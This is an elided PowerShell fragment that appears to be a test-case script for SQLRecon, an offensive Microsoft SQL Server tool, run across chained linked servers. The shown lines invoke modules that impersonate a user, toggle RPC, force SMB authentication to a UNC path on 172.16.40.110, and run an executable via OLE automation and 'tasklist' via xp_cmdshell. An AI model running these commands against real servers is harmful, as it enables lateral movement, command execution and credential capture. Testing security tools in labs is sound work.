...
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server2,$server3 /i:invaliduser /chain /m:links"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server2,$server3 /chain /m:enablerpc"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server2,$server3 /chain /m:disablerpc"
Write-Output ""
...
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3,$server4 /chain /m:smb /unc:\\172.16.40.110\test"
Write-Output ""
...
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:olecmd /c:'c:\temp\mb-chain-2.exe'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /chain /m:xpcmd /c:'tasklist'"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Linked Chain Modules Test Cases"
